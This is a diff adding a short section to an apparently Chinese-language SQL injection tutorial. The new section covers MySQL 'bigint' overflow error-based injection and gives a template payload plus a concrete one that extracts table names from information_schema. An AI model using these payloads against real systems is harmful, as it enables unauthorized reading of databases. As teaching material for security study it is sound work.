@@ -128,4 +128,14 @@ updatexml (XML_document, XPath_string, new_value);
 
 <br>
 
+#### bigint
+
+大整数报错，不需要知道原理，请按照以下格式输入即可  
+`(!(select * from (这里写你要查询的语句)x) - ~0)`
+
+譬如查询表名：  
+`!(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)-~0`
+
+<br>
+
 ### 盲注
